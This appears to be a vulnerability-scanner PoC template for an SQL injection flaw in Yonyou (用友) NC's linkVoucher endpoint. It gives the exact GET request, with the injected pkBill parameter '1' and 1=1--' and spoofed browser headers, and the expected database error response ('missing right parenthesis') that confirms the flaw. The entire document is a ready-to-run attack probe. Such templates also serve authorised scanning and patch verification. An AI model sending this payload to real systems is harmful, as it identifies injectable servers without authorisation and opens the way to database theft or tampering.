{
        'name': '用友NC linkVoucher SQL注入漏洞',
        'poc':[{'requests':{
            'method': 'get',
            'payload': '/portal/pt/yercommon/linkVoucher?pageId=login&pkBill=1\'%20and%201=1--',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'keep-alive'
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': '缺失右括号'
        }}]
    }